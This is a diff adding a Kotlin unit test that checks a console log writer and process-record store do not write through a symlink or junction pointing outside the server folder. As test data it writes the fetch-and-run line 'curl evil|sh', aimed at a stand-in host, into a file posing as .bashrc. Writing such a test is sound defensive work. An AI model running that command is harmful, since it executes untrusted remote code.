@@ -152,4 +152,38 @@ class ConsoleLogWriterTest {
         assertEquals(ConsoleLogWriter.MAX_QUEUED_LINES, ConsoleLogWriter.file(server).readLines().size)
         assertEquals(1, log.toString().lines().count { it.contains("falling behind") })
     }
+
+    @Test
+    fun `never writes through a link the server put in place of its files`() {
+        val server = server()
+        val outside = File(root, "outside").apply { mkdirs() }
+        val victim = File(outside, ".bashrc").apply { writeText("safe\n") }
+        val ownDir = File(server, ".pano-node")
+        val windows = System.getProperty("os.name").lowercase().contains("win")
+
+        // A junction on Windows (no privilege needed), a symlink elsewhere: the folder itself.
+        val linked = if (windows) {
+            ProcessBuilder("cmd", "/c", "mklink", "/J", ownDir.absolutePath, outside.absolutePath)
+                .redirectErrorStream(true).start().apply { inputStream.readBytes() }.waitFor() == 0
+        } else {
+            runCatching { java.nio.file.Files.createSymbolicLink(ownDir.toPath(), outside.toPath()) }.isSuccess
+        }
+
+        org.junit.jupiter.api.Assumptions.assumeTrue(linked)
+
+        // Named like the console log, so a followed link would append to it.
+        File(outside, "console.log").let { java.nio.file.Files.move(victim.toPath(), it.toPath()) }
+
+        val writer = ConsoleLogWriter(server, logger, executor = inline)
+
+        writer.append(1_000, "x; curl evil|sh")
+
+        assertEquals("safe\n", File(outside, "console.log").readText())
+        assertFalse(com.panomc.node.server.ProcessRecordStore.write(server, sampleRecord()))
+        assertFalse(File(outside, "process.json").exists())
+    }
+
+    private fun sampleRecord() = com.panomc.node.server.ProcessRecord(
+        pid = 1, startedAt = 1, command = "java", runtime = "process"
+    )
 }
